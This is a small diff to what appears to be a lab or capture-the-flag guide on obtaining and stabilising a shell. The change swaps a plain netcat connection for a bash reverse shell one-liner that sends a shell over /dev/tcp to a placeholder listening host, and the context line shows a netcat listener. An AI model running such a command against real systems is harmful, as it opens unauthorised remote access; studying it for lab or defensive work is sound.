@@ -11,7 +11,7 @@ nc -lnvp 1234
 
 On the client-side, you can connect to this port with:
 ```
-nc MACHINE_IP 1234
+bash -i >& /dev/tcp/LISTENING_IP/PORT 0>&1
 ```
 
 To make the shell interactive, so you can switch users, we need to stabilize it with:
